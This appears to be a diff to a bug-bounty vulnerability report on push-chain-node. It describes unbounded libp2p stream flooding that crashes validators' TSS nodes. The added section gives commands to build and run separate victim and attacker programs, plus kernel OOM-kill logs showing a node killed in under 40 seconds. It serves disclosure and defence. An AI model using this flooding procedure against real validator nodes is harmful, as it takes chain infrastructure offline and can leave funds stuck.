@@ -5,7 +5,7 @@
 ## TITLE
 
 ```text
-Unauthenticated, unbounded libp2p stream flooding lets any internet peer exhaust every validator's TSS node with zero funding and no privileged role
+Unauthenticated, unbounded libp2p stream flooding lets any internet peer crash every validator's TSS node with zero funding and no privileged role
 ```
 
 ---
@@ -89,8 +89,9 @@ of chain liveness / stuck funds.
 
 ---
 
-## VALIDATION STEPS (runnable PoC)
+## VALIDATION STEPS (runnable PoC — includes an actual process kill)
 
+**Part A — resource-growth PoC (Go test, in-process measurement).**
 Place `flood_poc_test.go` at
 `universalClient/tss/networking/libp2p/flood_poc_test.go` in the
 `push-chain-node` checkout (@ `0648551`) and run:
@@ -118,15 +119,46 @@ AFTER drain: goroutines=51 heap=4817704 bytes (4.59 MiB)
 ESCALATION RESULT: attempted=4800 opened=4800
 ```
 
-**100% of the 4,800 attacker-opened streams were accepted — zero rejections
-from the victim of any kind.** Resource usage grew in lock-step with attacker
-effort across all 6 waves with no plateau or backpressure, and fully drained
-only after `IOTimeout` elapsed. `RESULT_throttled_attacker_baseline.txt`
-(included) shows the same test *before* disabling the attacker's own
-resource manager — there, only 143/4,800 succeeded, and every failure was
-`"transient: cannot reserve outbound stream"`, which is libp2p's rejection on
-the attacker's own dialing side, not any defense by the victim — included to
-show clearly that the victim never rejects a stream in either configuration.
+100% of the 4,800 attacker-opened streams were accepted — zero rejections
+from the victim of any kind. `RESULT_throttled_attacker_baseline.txt`
+(included) shows the same test *before* disabling the attacker's own resource
+manager — there, only 143/4,800 succeeded, with every failure being libp2p's
+rejection on the attacker's *own* dialing side (`"transient: cannot reserve
+outbound stream"`), not any defense by the victim.
+
+**Part B — the actual crash (two separate OS processes, no simulation).**
+`crash-proof/tssvictim_main.go` runs the real, unmodified `Network.New()` as
+its own OS process; `crash-proof/tssattacker_main.go` is a fully separate
+process that only knows the victim's public peer ID / multiaddr / protocol ID
+(exactly what on-chain `NetworkInfo.MultiAddrs` gives any outside observer).
+
+```bash
+go build -o tssvictim   ./universalClient/tss/networking/libp2p/cmd/tssvictim
+go build -o tssattacker ./universalClient/tss/networking/libp2p/cmd/tssattacker
+
+mkdir /sys/fs/cgroup/memory/tsspoc
+echo $((150*1024*1024)) > /sys/fs/cgroup/memory/tsspoc/memory.limit_in_bytes
+setsid bash -c 'echo $$ > /sys/fs/cgroup/memory/tsspoc/cgroup.procs; exec ./tssvictim' &
+# victim prints PEERID / PROTOCOL / ADDR -- feed them to the attacker below:
+
+./tssattacker <victim-peerid> /push/tss/1.0.0 60 <victim-multiaddr>
+```
+
+**Result: the Linux kernel OOM-killer killed the victim process in under 40
+seconds** (`crash-proof/CRASH_EVIDENCE_dmesg_oom_kill.txt`):
+
+```text
+tssvictim invoked oom-killer: gfp_mask=0xcc0(GFP_KERNEL), order=0, oom_score_adj=0
+oom-kill:constraint=CONSTRAINT_MEMCG,...,oom_memcg=/tsspoc,task_memcg=/tsspoc,task=tssvictim,pid=23668
+Memory cgroup out of memory: Killed process 23668 (tssvictim) total-vm:1830052kB, anon-rss:152644kB, ...
+```
+
+Memory usage climbed 66 → 110 → 139 → 143 MiB over 27 seconds, then the
+process was killed at ~t+39s. The attacker's own log: `FLOOD DONE
+opened=129813 failed=14308` — **a single attacker process on one machine
+opened 129,813 streams and killed one validator's TSS node in under 40
+seconds**, using nothing but ordinary outbound connections and 4 bytes of
+payload per stream. No privileged role, no funding, no unusual compute.
 
 ---
 
